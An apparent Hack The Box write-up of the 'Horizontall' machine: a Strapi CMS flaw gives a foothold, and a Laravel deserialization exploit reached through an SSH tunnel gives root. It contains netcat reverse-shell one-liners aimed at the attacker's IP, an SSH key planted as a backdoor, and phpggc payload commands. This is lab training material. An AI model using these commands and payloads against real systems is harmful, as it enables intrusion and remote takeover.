@@ -1,0 +1,399 @@
+#+setupfile: ../templates/level-0.org
+#+summary: This was an easy linux box, with a website running a vulnerable API framework. After exploiting this and getting a user shell, we can install an ssh backdoor that makes it possible to elevate privileges on a local service by creating a tunnel.
+#+filetags: :HTB:write-up:hacking:
+#+title: HTB | Horizontall
+* Introduction
+Hello and welcome to my write-up for Horizontall.
+This was an easy box with a webserver running on port 80.
+I do a couple of tricks like ssh tunneling, to exploit a service running locally on the machine.
+But with that said, let's get hacking!
+* Recon
+First things first, we'll run ~nmap~ to get a better image of the services running on the box.
+After this we can do some web enumeration on the web server running on port 80.
+
+** Nmap
+I split the scan up into two parts, as I initially wanted to go kinda stealthy on the machine.
+This however went pretty quickly out the window.
+#+caption: Initial scan of the box
+#+begin_example
+┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/hackthebox/machines/horizontall ]
+└─> $ nmap -p- 10.129.204.161 -oA nmap/syn_scan_all_ports                                          17:36
+Starting Nmap 7.92 ( https://nmap.org ) at 2021-08-29 17:36 CEST
+Nmap scan report for 10.129.204.161
+Host is up (0.040s latency).
+Not shown: 65533 closed tcp ports (conn-refused)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+Nmap done: 1 IP address (1 host up) scanned in 16.66 seconds
+
+#+end_example
+After getting the open ports, I did a version scan and ran the default ~nmap~ scripts.
+#+caption: Script and Version scan of target ports
+#+begin_example
+┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/hackthebox/machines/horizontall ]
+└─> $ sudo nmap -sC -sV -p 22,80 -O -oA nmap/script_version 10.129.204.161                         17:38
+[sudo] password for c3lphie:
+Starting Nmap 7.92 ( https://nmap.org ) at 2021-08-29 17:39 CEST
+Nmap scan report for 10.129.204.161
+Host is up (0.030s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 ee:77:41:43:d4:82:bd:3e:6e:6e:50:cd:ff:6b:0d:d5 (RSA)
+|   256 3a:d5:89:d5:da:95:59:d9:df:01:68:37:ca:d5:10:b0 (ECDSA)
+|_  256 4a:00:04:b4:9d:29:e7:af:37:16:1b:4f:80:2d:98:94 (ED25519)
+80/tcp open  http    nginx 1.14.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://horizontall.htb
+|_http-server-header: nginx/1.14.0 (Ubuntu)
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Aggressive OS guesses: Linux 4.15 - 5.6 (95%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Linux 5.0 - 5.3 (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 (93%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 11.98 seconds
+#+end_example
+Here we get a hostname ~horizontall.htb~, and the version of the web server.
+~nginx 1.14.0~ which is a reverse proxy, this could mean that there might be more running on the server than first thought.
+** Web enumeration
+Let's add the hostname to ~/etc/hosts~, before we start exploring the website.
+#+begin_example
+[root@c3lphie-laptop horizontall]# echo "10.129.204.161    horizontall.htb" >> /etc/hosts
+#+end_example
+*** Gobuster
+Before actually looking at the site, I started ~gobuster~:
+#+begin_example
+┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/hackthebox/machines/horizontall ]
+└─> $ gobuster dir -u "http://horizontall.htb" -w $REPOS/SecLists/Discovery/Web-Content/raft-small-words.txt
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://horizontall.htb
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /home/c3lphie/repositories/SecLists/Discovery/Web-Content/raft-small-words.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Timeout:                 10s
+===============================================================
+2021/08/29 17:51:08 Starting gobuster in directory enumeration mode
+===============================================================
+/js                   (Status: 301) [Size: 194] [--> http://horizontall.htb/js/]
+/css                  (Status: 301) [Size: 194] [--> http://horizontall.htb/css/]
+/img                  (Status: 301) [Size: 194] [--> http://horizontall.htb/img/]
+/.                    (Status: 301) [Size: 194] [--> http://horizontall.htb/./]
+                                                                                 [[3~
+===============================================================
+2021/08/29 17:53:17 Finished
+===============================================================
+#+end_example
+But as you can see from the output there isn't a lot to come after...
+*** Zaproxy
+I used ~zaproxy~'s HUD, which is firefox with some extra stuff for attacking web apps.
+The site index, it is a pretty simple website for some new tech-startup.
+#+attr_org: :width 700
+[[file:assets/2021-08-29_17-58-08_screenshot.png]]
+
+There is even a contact form that doesn't work.
+#+attr_org: :width 700
+[[file:assets/2021-08-29_17-58-57_screenshot.png]]
+
+It has been created in ~vue.js~, but googling around for vulnerabilties won't give us much unfortunately.
+#+attr_org: :width 700
+[[file:assets/2021-08-29_18-12-54_screenshot.png]]
+*** App.js
+There is a subdomain leaked in the file ~app.js~:
+#+caption: Subdomain leak in ~app.js~
+#+begin_src js
+            y = {
+                name: "App",
+                components: {
+                    Navbar: v,
+                    Home: w
+                },
+                data: function() {
+                    return {
+                        reviews: []
+                    }
+                },
+                methods: {
+                    getReviews: function() {
+                        var t = this;
+                        r.a.get("http://api-prod.horizontall.htb/reviews").then((function(s) {
+                            return t.reviews = s.data
+                        }))
+                    }
+                }
+            },
+#+end_src
+Let's add this to ~/etc/hosts~, and start poking a bit on that.
+*** api-prod.horizontall.htb
+**** Gobuster
+Why don't we start off with ~gobuster~ on the new subdomain:
+#+begin_example
+┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/hackthebox/machines/horizontall ]
+└─> $ gobuster dir -u "http://api-prod.horizontall.htb/" -w $REPOS/SecLists/Discovery/Web-Content/raft-small-words.txt
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://api-prod.horizontall.htb/
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /home/c3lphie/repositories/SecLists/Discovery/Web-Content/raft-small-words.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Timeout:                 10s
+===============================================================
+2021/08/29 19:13:40 Starting gobuster in directory enumeration mode
+===============================================================
+/admin                (Status: 200) [Size: 854]
+/Admin                (Status: 200) [Size: 854]
+/users                (Status: 403) [Size: 60]
+/reviews              (Status: 200) [Size: 507]
+/.                    (Status: 200) [Size: 413]
+/ADMIN                (Status: 200) [Size: 854]
+/Users                (Status: 403) [Size: 60]
+/Reviews              (Status: 200) [Size: 507]
+
+===============================================================
+2021/08/29 19:16:05 Finished
+===============================================================
+
+#+end_example
+Looks like we got some admin site, this could very well be our way in!
+
+If we look at the headers in the HTTP response:
+#+begin_example
+HTTP/1.1 200 OK
+Server: nginx/1.14.0 (Ubuntu)
+Date: Sun, 29 Aug 2021 17:15:54 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 413
+Connection: keep-alive
+Vary: Origin
+Content-Security-Policy: img-src 'self' http:; block-all-mixed-content
+Strict-Transport-Security: max-age=31536000; includeSubDomains
+X-Frame-Options: SAMEORIGIN
+X-XSS-Protection: 1; mode=block
+Last-Modified: Wed, 02 Jun 2021 20:00:29 GMT
+Cache-Control: max-age=60
+X-Powered-By: Strapi <strapi.io>
+
+#+end_example
+We can see that this is running ~Strapi~.
+Inorder to get the version of Strapi, go to following endpoint:
+: /admin/init
+This responds with the following JSON:
+#+begin_example
+{
+  "data": {
+    "uuid": "a55da3bd-9693-4a08-9279-f9df57fd1817",
+    "currentEnvironment": "development",
+    "autoReload": false,
+    "strapiVersion": "3.0.0-beta.17.4"
+  }
+}
+#+end_example
+If we duckduckgo this version with exploit, we should find the following link: [[https://www.exploit-db.com/exploits/50239]]
+
+This python script should give us foothold and user flag!
+* Exploitation
+** Get user
+Let's run the exploit script:
+#+begin_example
+┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/hackthebox/machines/horizontall ]
+└─> $ /usr/bin/python script.py "http://api-prod.horizontall.htb"
+[+] Checking Strapi CMS Version running
+[+] Seems like the exploit will work!!!
+[+] Executing exploit
+
+
+[+] Password reset was successfully
+[+] Your email is: admin@horizontall.htb
+[+] Your new credentials are: admin:SuperStrongPassword1
+[+] Your authenticated JSON Web Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjQxODQzNTQyLCJleHAiOjE2NDQ0MzU1NDJ9.QJOyBAyGH8OBqNekQ4nm4XnUQ7pb_QHBFdY5GuhdGSc
+
+
+$> 
+#+end_example
+And we got a shell!
+This shell was rather unstable so I opted for this reverse shell curtesy of [[https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet][pentestmonkey]]:
+#+begin_example
+$> rm /tmp/f;mkfifo /tmp/f; cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.17.47 4444 >/tmp/f
+#+end_example
+
+And now we got proper access:
+#+begin_example
+┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/hackthebox/machines/horizontall ]
+└─> $ nc -lnvp 4444
+Connection from 10.129.176.172:41956
+/bin/sh: 0: can't access tty; job control turned off
+$ whoami
+strapi
+$ 
+#+end_example
+
+So let's go find our first flag!
+#+begin_example
+$ cd home
+$ ls
+developer
+$ cd developer
+$ ls
+composer-setup.php
+myproject
+user.txt
+$ cat user.txt
+3018████████████████████████████
+#+end_example
+
+Looking around there are creds for the database in the ~database.json~ file in strapi's config folder.
+#+begin_example
+$ cat database.json
+{
+  "defaultConnection": "default",
+  "connections": {
+    "default": {
+      "connector": "strapi-hook-bookshelf",
+      "settings": {
+        "client": "mysql",
+        "database": "strapi",
+        "host": "127.0.0.1",
+        "port": 3306,
+        "username": "developer",
+        "password": "#J!:F9Zt2u"
+      },
+      "options": {}
+    }
+  }
+}
+#+end_example
+But this didn't give anything useful for escalating our privileges...
+
+It was about this time I remembered this little trick for upgrading you're shell:
+: python -c 'import pty;pty.spawn("/bin/bash")'
+
+Now we are ready to root!
+** Priv esc
+I wanted to run ~linPEAS.sh~ on the box, so I created a quick python web server and downloaded the script from there.
+
+In ~linPEAS.sh~ output, there is something interesting under the active ports section:
+#+begin_example
+[+] Active Ports
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-ports
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
+tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
+tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
+tcp        0      0 127.0.0.1:1337          0.0.0.0:*               LISTEN      1779/node /usr/bin/
+tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -
+tcp        0      0 10.129.176.172:41986    10.10.17.47:4444        ESTABLISHED 22039/nc
+tcp        0      0 127.0.0.1:54426         127.0.0.1:1337          TIME_WAIT   -
+tcp        0    364 10.129.176.172:42832    10.10.17.47:1337        ESTABLISHED 22071/nc
+tcp6       0      0 :::80                   :::*                    LISTEN      -
+tcp6       0      0 :::22                   :::*                    LISTEN      -
+udp        0      0 10.129.176.172:35984    1.1.1.1:53              ESTABLISHED -
+udp        0      0 10.129.176.172:45356    1.1.1.1:53              ESTABLISHED -
+udp        0      0 10.129.176.172:50554    1.1.1.1:53              ESTABLISHED 22026/node
+udp        0      0 10.129.176.172:44466    1.1.1.1:53              ESTABLISHED -
+udp        0      0 10.129.176.172:60232    1.1.1.1:53              ESTABLISHED 24170/node
+udp        0      0 0.0.0.0:68              0.0.0.0:*                           -
+udp        0      0 10.129.176.172:52307    1.1.1.1:53              ESTABLISHED 21997/node
+#+end_example
+There is in-fact a laravel service running on port 8000.
+
+I used ~curl~ to findout the version number, didn't get a copy of the output...
+It did however reveal that it is version 8 with PHP version 7.4.18
+: Laravel v8 (PHP v7.4.18)
+
+Searching around a bit led me to this github repository:
+https://github.com/ambionics/laravel-exploits
+
+But instead of uploading and running it on the machine I decided to create a tunnel using SSH.
+I should preface this by saying this part is completly by memory because I forgot to write it down...
+
+I created an ssh key using:
+#+begin_example
+┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/hackthebox/machines/horizontall ]
+└─> $ ssh-keygen -t rsa
+Generating public/private rsa key pair.
+Enter file in which to save the key (/home/c3lphie/.ssh/id_rsa): ./id_rsa
+Enter passphrase (empty for no passphrase):
+Enter same passphrase again:
+Your identification has been saved in ./id_rsa
+Your public key has been saved in ./id_rsa.pub
+The key fingerprint is:
+SHA256:1TbsjKA+ZD2qnrItY1n9eXOhmtKqWBkxI/KIxSfH4KQ c3lphie@c3lphie-laptop
+The key's randomart image is:
++---[RSA 3072]----+
+|  o              |
+| = o       o     |
+|E * B   . . =    |
+|.= = + o o = .   |
+|o . ..+ S . o    |
+|    .*.. .  .    |
+|   oo +o . . .   |
+|  *+ o..+.+ .    |
+| .o**..ooo o     |
++----[SHA256]-----+
+#+end_example
+
+Then using the same webserver, as for ~linPEAS.sh~, I uploaded ~id_rsa.pub~.
+Created the ~~/.ssh/~ folder in ~strapi~'s home folder, and ran:
+: cat id_rsa.pub > .ssh/authrized_keys
+
+Now we can setup an ssh tunnel to the laravel service with the following command:
+: ssh -L 8000:127.0.0.1:8000 -i id_rsa strapi@horizontall.htb
+
+I then tested to see if the exploit worked, this is done by generating the payload with:
+: php -d'phar.readonly=0' ./phpggc --phar phar -o /tmp/exploit.phar --fast-destruct monolog/rce1 system id
+
+Which when run with the exploit gives us this output:
+#+begin_example
+┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/hackthebox/machines/horizontall/www ]
+└─> $ /usr/bin/python laravel.py http://127.0.0.1:8000 /tmp/exploit.phar
++ Log file: /home/developer/myproject/storage/logs/laravel.log
++ Logs cleared
++ Successfully converted to PHAR !
++ Phar deserialized
+--------------------------
+uid=0(root) gid=0(root) groups=0(root)
+--------------------------
++ Logs cleared
+#+end_example
+And we have root!
+Now all we need to do is create a reverse shell!
+: php -d'phar.readonly=0' ./phpggc --phar phar -o /tmp/exploit.phar --fast-destruct monolog/rce1 system "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.17.47 1337>/tmp/f"
+
+Set up a nc listener:
+: nc -lnvp 1337
+
+And then run the exploit and get the flag:
+#+begin_example
+Connection from 10.129.176.172:43028
+/bin/sh: 0: can't access tty; job control turned off
+# whoami
+root
+# ls
+favicon.ico
+index.php
+robots.txt
+web.config
+# cd
+# ls
+boot.sh
+pid
+restart.sh
+root.txt
+# cat root.txt
+1588████████████████████████████
+#
+#+end_example
+
